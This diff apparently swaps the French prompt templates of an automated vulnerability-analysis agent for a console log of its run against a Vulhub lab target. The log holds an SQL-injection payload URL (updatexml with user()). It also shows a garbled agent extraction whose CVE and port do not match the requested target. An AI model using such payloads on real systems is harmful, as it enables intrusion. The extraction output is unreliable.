@@ -1,20 +1,39 @@
-# --- Prompts de l'Agent ---
-EXTRACTION_PROMPT_TEMPLATE = """ROLE: Expert en cybersécurité.
-TACHE: Analyse cette documentation Vulhub et extrais les informations en JSON. Ne réponds rien d'autre que le JSON.
-CHAMPS: `ports_exposed` (list[int]), `cve_ids` (list[str]), `reproduction_commands` (list[str]), `success_indicators` (list[str]).
+==================================================
+🤖 Bienvenue dans l'Orchestrateur d'Analyse de Vulnérabilités
+==================================================
+Quelle VM Vulhub est actuellement UP ? (format: service/CVE-ID) apache/CVE-2024-28752
+Quelle est l'adresse IP et le port de la cible pour 'apache/CVE-2024-28752' ? 100.91.1.1:50080
 
-DOC: {vulhub_doc}
+--- DÉBUT DE L'ANALYSE POUR apache/CVE-2024-28752 SUR 100.91.1.1:50080 ---
+[1/5] Récupération de la documentation pour 'apache/CVE-2024-28752'...
+✓ Documentation récupérée.
+[2/5] Extraction des informations clés de la documentation...
+✗ Erreur de parsing JSON pour l'extraction : 
+Here is the JSON data extracted from the documentation:
 
-JSON:"""
+{
+"ports_exposed": [
+8080
+],
+"cve_ids": [
+"CVE-2017-8917"
+],
+"reproduction_commands": [
+"docker compose up -d",
+"http://your-ip:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)"
+],
+"success_indicators": [
+!"SQL injection attack successful!"
+]
+}
 
-ANALYSIS_PROMPT_TEMPLATE = """ROLE: Analyste sécurité offensif.
-TACHE: Crée un rapport d'exploitation JSON en synthétisant les données. Ne réponds rien d'autre que le JSON.
-CHAMPS: `target_confirmed` (dict: `status`: bool, `reason`: str), `vulnerability_details` (dict: `cve`: str, `cvss_score`: str, `attack_vector`: str), `exploitation_plan` (dict: `primary_technique`: str, `commands_to_execute`: list[str], `success_criteria`: str), `next_steps_suggestion` (list[str]).
+------------------------------------------------------------
+✅ RAPPORT D'ANALYSE FINAL REÇU PAR L'ORCHESTRATEUR
+------------------------------------------------------------
 
-DONNEES:
-- Doc extraite: {extracted_info}
-- Scan de ports: {scan_results}
-- Tests HTTP: {probe_results}
-- Données CVE: {cve_results}
+✗ L'analyse a échoué.
 
-JSON:"""
+💥 Une erreur inattendue est survenue : 'NoneType' object has no attribute 'get'
+
+✅ ORCHESTRATEUR INTERACTIF PRÊT.
+Exécutez la cellule ci-dessus (`main_loop()`) pour démarrer l'interaction.
